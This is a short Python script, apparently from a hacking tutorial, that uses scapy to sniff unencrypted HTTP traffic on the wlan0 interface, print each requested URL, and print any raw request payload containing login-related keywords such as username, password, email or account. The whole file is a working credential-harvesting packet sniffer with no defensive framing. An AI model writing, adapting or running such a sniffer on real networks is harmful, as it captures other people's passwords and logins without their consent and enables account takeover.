
import keyword
import scapy.all as scapy
from scapy.layers import http
 

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def geturl(packet):
    return packet[http.HTTPRequest].Host  +  packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username","txtUsername","Password", "login","password","pass","user","user",
                "txtUserName","txt",
                       'username', 'user', 'name', 'login', 'nickname', 'userfield', 'login-name', 'log',
                     "email", "login-id", 'user-name', 'userID', 'userid', 'user-id', 'login_name', 'login-name', 'login-user', 'login_user', 'account', 'acc-name',
              "account-user", "account-name"
            
            
            ]
            for keyword in keywords:
                keyword = keyword.encode()
                if keyword in load:
                    return load
                    
                    



def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        #print(packet.show)
        url = geturl(packet)
        print("[+] HTTP Request > " + url.decode())
        login_info = get_login_info(packet)
        if login_info:
            print("\n\nPossimble username/Password > " + login_info.decode() + "\n\n")
        
                    

                                 

sniff("wlan0")